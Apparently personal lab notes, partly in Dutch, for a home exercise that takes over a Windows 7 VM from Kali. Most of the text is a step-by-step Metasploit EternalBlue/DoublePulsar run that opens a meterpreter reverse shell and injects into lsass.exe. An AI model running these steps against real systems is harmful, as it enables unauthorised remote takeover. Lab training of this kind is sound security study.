1) Run "Setup Script"
	- make sure Kali-2023.4-64bit is unzipped so the folder 64bit is accessible in the root
	- make sure the windows iso file is accessible in the root
	
# WINDOWS VM

1) Installeer Guest Additions op Windows
	- Open Computer - CD Drive (E:) - vboxadditions - VBoxWindowsAdditions.exe
	- Herstart VM

2) Run "Transfer To Windows VM"

3) Op de Windows VM, run de bat file "post-install-windows-7" die op het bureaublad staat

4) Open CMD en run 'ipconfig'. Noteer het IPv4 Address

# KALI VM

- sudo apt-get update

- git clone https://github.com/w0rtw0rt/EternalBlue

- msfconsole

- exit

- sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb

- sudo dpkg --add-architecture i386

- sudo apt-get install libwine (of gewoon wine?)

- sudo mkdir /root/.wine

- sudo mkdir /root/.wine/c_drive ?

- sudo metasploit

- use auxiliary/scanner/smb/smb_ms17_010

- set RHOSTS <Windows IP>

- run

- use payload/windows/x64/meterpreter/reverse_tcp

- set LHOST <Kali IP>

- use exploit/windows/smb/eternalblue_doublepulsar

- set payload payload/windows/x64/meterpreter/reverse_tcp

- set TARGET 8

- set RHOSTS <windows ip>

- set LHOST <kali ip>

- set TARGETARCHITECTURE x64

- set PROCESSINJECT lsass.exe

- set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/

- set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/

- set WINEPATH /home/osboxes/.wine/drive_c/

- run

YOU HAVE GOT CONTROL OVER WINDOWS PC
